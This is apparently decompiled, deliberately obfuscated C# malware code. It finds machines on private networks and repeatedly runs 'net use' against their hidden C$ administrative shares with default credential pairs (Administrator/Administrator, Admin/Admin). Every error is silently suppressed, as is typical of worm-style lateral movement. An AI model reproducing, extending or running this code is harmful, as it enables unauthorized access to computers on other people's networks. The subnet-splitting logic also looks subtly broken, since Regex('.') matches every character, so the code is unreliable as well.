using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;

namespace vQzMGKHeycFziMq;

internal class fdtHbnwCqk
{
	public static void RezDjjEEciL()
	{
		List<chzkAitvHQDCcEd> list = chzkAitvHQDCcEd.MohkJvMFGBDqoB();
		foreach (chzkAitvHQDCcEd item in list)
		{
			try
			{
				if (item.lMtvCPvYiCbyR.StartsWith("10.") || item.lMtvCPvYiCbyR.StartsWith("172.") || item.lMtvCPvYiCbyR.StartsWith("192.168."))
				{
					fxPtfJOjYtkx.hsyUNnDlbwg(item.NLMYJrInFggx, item.lMtvCPvYiCbyR, "255.255.255.0");
				}
			}
			catch
			{
			}
			Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
		}
		foreach (chzkAitvHQDCcEd item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string uYcVsXyCqVxSC = regex.Split(item2.lMtvCPvYiCbyR)[0] + "." + regex.Split(item2.lMtvCPvYiCbyR)[1] + "." + regex.Split(item2.lMtvCPvYiCbyR)[2];
				List<string> list2 = VnGmiyGHPlPO.LLMQTwNHzIcHd(uYcVsXyCqVxSC);
				foreach (string item3 in list2)
				{
					if (item2.lMtvCPvYiCbyR.StartsWith("10.") || item2.lMtvCPvYiCbyR.StartsWith("172.") || item2.lMtvCPvYiCbyR.StartsWith("192.168."))
					{
						yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Administrator Administrator");
						yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Admin Admin");
					}
				}
			}
			catch
			{
			}
		}
	}
}
